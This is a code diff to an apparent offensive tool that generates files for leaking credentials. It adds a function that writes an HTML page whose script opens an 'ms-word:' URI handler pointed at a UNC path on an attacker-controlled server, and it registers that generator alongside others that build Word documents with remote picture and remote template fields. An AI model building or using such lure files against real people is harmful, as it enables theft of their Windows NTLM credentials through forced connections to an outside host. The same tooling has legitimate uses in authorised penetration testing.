@@ -158,6 +158,19 @@ def create_htm(generate,server,filename):
 	file.close()
 	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
 
+# .htm with rlocal handler attack
+# Filename: shareattack-(handler).htm, action=open, attacks=open in web browser, will automatically open word
+def create_htm_handler(generate,server,filename):
+	file = open(filename,'w')
+	file.write('''<!DOCTYPE html>
+<html>
+	<script>
+		location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+	</script>
+</html>''')
+	file.close()
+	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
+
 # .docx file with remote includepicture field attack
 def create_docx_includepicture(generate,server,filename):
 	# Source path  
@@ -561,6 +574,7 @@ if (args.generate == "all" or args.generate == "modern"):
 	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
 
 	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
+	create_htm_handler(args.generate, args.server, os.path.join(args.filename, args.filename + "-(handler).htm"))
 
 	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
 	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
